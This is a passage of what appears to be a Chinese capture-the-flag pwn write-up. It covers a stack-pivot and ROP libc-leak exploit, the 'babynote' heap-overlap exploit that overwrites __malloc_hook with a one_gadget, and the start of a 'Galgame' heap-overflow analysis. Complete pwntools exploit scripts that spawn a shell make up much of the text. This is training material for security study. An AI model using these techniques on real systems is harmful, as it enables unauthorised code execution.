number">0x0000000000400646</span>leave_name<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6010d0</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span>leave_message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">16</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>leave_message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'bin_sh_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>leave_name<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6010d0</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span>leave_message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">16</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>leave_message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>解释一下exp</p><pre class=" language-python"><code class="language-python">leave_name<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span></code></pre><p>这一句name被设置为0x61616161，大于256</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6010d0</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span>leave_message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre><p>溢出到rbp，将rbp设置为0x6010d0-0x10，这样后面再调用leave_message的话就能读入0x100个字节</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">16</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>leave_message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre><p>直接溢出，泄露libc地址</p><p>之后的就是重复上面的操作，调用system(“/bin/sh”)</p><h3 id="0x5-babynote"><a href="#0x5-babynote" class="headerlink" title="0x5.babynote"></a>0x5.babynote</h3><p>只开启了NX保护</p><p>一共有6个功能</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. Add note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. Show note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3. Delete note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4. Edit note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5. Reset registration information"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"6. Check registration information"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"7. Exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在程序一开始有一个regist函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">regist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-50h]</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-38h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-28h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x50uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  qword_6020D0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  dest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x18uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x18uLL</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your motto: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your age: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strncpy</span><span class="token punctuation">(</span>qword_6020D0<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  qword_6020C8 <span class="token operator">=</span> v2<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>注意到其中的<code>strcpy(dest, &amp;s);</code>会将s中的值复制到dest中，而dest是一个0x18的chunk的指针，s是利用mmap开辟的一个0x50的区域的指针，我们可以往其中写入0x18个字节，看似无法利用strcpy进行溢出，然而<code>s</code>和<code>v2</code>是连续的，v2是一个长整型的变量，存储着年龄，所以当我们往s中输入0x18个字节就会和v2拼接在一起，strcpy就会造成溢出，可以通过age修改下一个chunk的size，构造出overlap。exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babynotes'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babynotes'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23.so'</span><span class="token punctuation">)</span>onegadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf0364</span><span class="token punctuation">,</span> <span class="token number">0xf1207</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> motto<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your name:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your motto:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>motto<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your age:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input index:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input note size:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input index:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input index:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input index:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your note:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> motto<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your name:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your motto:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>motto<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your age:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span>register<span class="token punctuation">(</span><span class="token string">'l0ck'</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>libc_realloc <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> libc_base<span class="token operator">+</span>onegadget<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_realloc => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_realloc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'one_gadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>reset<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="0x6-Galgame"><a href="#0x6-Galgame" class="headerlink" title="0x6.Galgame"></a>0x6.Galgame</h3><p>一共有五个功能</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">sub_4011E7</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDay %d:\n"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. Send her a little gift."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. Invite her to go to a movie."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3. Confess to her!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4. Collection."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5. Leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>第一个功能能够分配一个0x68的chunk</p><pre class=" language-c"><code class="language-c">qword_404060<span class="token punctuation">[</span><span class="token number">6</span> <span class="token operator">-</span> v6<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x68uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>第二个功能是在0x68的chunk的末尾进行编辑</p><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"idx >> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> qword_404060<span class="token punctuation">[</span><span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"movie name >> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   v4 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>qword_404060<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nHotaru: What a good movie! I like it~\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[ You've gained a lot favor of her! ]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>所以这里存在堆溢出，可以修改下一个chunk的size</p><p>第三个功能分配一个0x1000的chunk</p><pre class=" language-c"><code class="language-c">qword_404098 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>第四个功能输出所有chunk的值</p><pre class=" language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> v11 <span class="token operator">&lt;=</span> <span class="token number">6</span> <span class="token operator">-</span> v6 <span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v11<span class="token punctuation">,</span> qword_404060<span class="token punctuation">[</span>v11<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">++</span>v11<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>第五个功能往0x4040a0处读入八字节数据</p><pre class=" language-c"><code class="language-c"><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_4040A0<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"No bye!"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4040A0<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\n(='3'=)>daisuki~\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token 